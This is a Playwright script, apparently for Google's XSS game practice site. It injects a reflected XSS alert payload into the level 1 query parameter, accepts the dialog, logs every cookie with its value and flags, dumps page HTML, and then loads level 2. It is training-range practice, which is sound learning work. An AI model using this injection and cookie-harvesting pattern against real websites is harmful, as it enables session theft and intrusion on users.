const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  page.on('response', async (resp) => {
    const setCookie = resp.headers()['set-cookie'];
    if (setCookie) {
      console.log(`[response] ${resp.status()} ${resp.url()}`);
      console.log(`  set-cookie: ${setCookie}`);
    }
  });
  page.on('dialog', async (dialog) => {
    console.log(`[dialog] type=${dialog.type()} msg=${dialog.message().slice(0, 100)}`);
    await dialog.accept();
  });

  const url = `https://xss-game.appspot.com/level1/frame?query=${encodeURIComponent("<script>alert('xss')</script>")}`;
  console.log(`[nav] ${url}`);
  await page.goto(url, { waitUntil: 'load', timeout: 15000 });
  await page.waitForTimeout(2000);

  const allCookies = await context.cookies();
  console.log(`[cookies] count=${allCookies.length}`);
  for (const c of allCookies) {
    console.log(`  - ${c.name}=${c.value} domain=${c.domain} path=${c.path} httpOnly=${c.httpOnly} secure=${c.secure} sameSite=${c.sameSite}`);
  }

  console.log(`[url] ${page.url()}`);
  console.log(`[title] ${await page.title()}`);
  const html = await page.content();
  console.log(`[html] first 500: ${html.slice(0, 500)}`);

  // Now try to go to level 2
  console.log('\n[navigate to L2]');
  const l2url = 'https://xss-game.appspot.com/level2/frame';
  const resp = await page.goto(l2url, { waitUntil: 'load', timeout: 15000 });
  console.log(`[L2] status=${resp?.status()} url=${page.url()}`);
  console.log(`[L2] title=${await page.title()}`);
  const l2html = await page.content();
  console.log(`[L2] first 500: ${l2html.slice(0, 500)}`);

  await context.close();
  await browser.close();
})();
